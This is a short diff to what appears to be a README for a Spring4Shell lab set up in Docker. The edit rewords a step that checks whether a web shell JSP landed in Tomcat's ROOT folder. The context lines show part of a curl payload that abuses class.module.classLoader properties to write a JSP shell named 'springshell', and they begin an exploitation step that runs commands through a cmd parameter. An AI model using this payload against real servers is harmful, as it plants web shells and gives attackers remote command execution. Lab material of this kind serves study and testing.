@@ -52,8 +52,8 @@ curl --request POST \
   --data class.module.classLoader.resources.context.parent.pipeline.first.prefix=springshell \
   --data class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
 ```
-3. Check if jsp is present in embedded tomcat ROOT folder:
-`docker exec -it springshell bash -c "cd /tmp/tomcat.*.8080/work/Tomcat/localhost/ROOT;ls"`
+3. Check if a jsp file is present in embedded tomcat ROOT folder:
+`docker exec -it springshell bash -c "cd /tmp/tomcat.*.8080/work/Tomcat/localhost/ROOT;ls"`. If there is no jsp, _the application is not compromised_
 
 ## Step 2: Exploitation
 - Hit this url in the browser and update the shell cmd (_cmd_ query param) to print the result of the command
